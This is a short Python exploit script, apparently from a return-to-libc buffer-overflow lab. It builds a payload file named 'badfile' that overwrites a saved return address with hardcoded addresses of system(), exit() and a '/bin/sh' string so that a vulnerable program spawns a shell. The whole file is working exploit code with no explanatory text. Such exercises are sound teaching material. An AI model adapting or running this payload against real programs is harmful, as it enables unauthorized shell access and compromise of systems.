#!/usr/bin/env python3
import sys

EBP = 0xffffc4c8
BUF = 0xffffc4b0
LEN = 300

def main():
  # Fill content with non-zero values
  content = bytearray(0xaa for i in range(LEN))

  X = (EBP + 12) - BUF
  sh_addr = 0xffffcba7       # The address of "/bin/sh"
  content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

  Y = (EBP + 4) - BUF
  system_addr = 0xf7e02780   # The address of system()
  content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

  Z = (EBP + 8) - BUF
  exit_addr = 0xf7df50c0     # The address of exit()
  content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

  # Save content to a file
  with open("badfile", "wb") as f:
    f.write(content)

if __name__ == "__main__":
  main()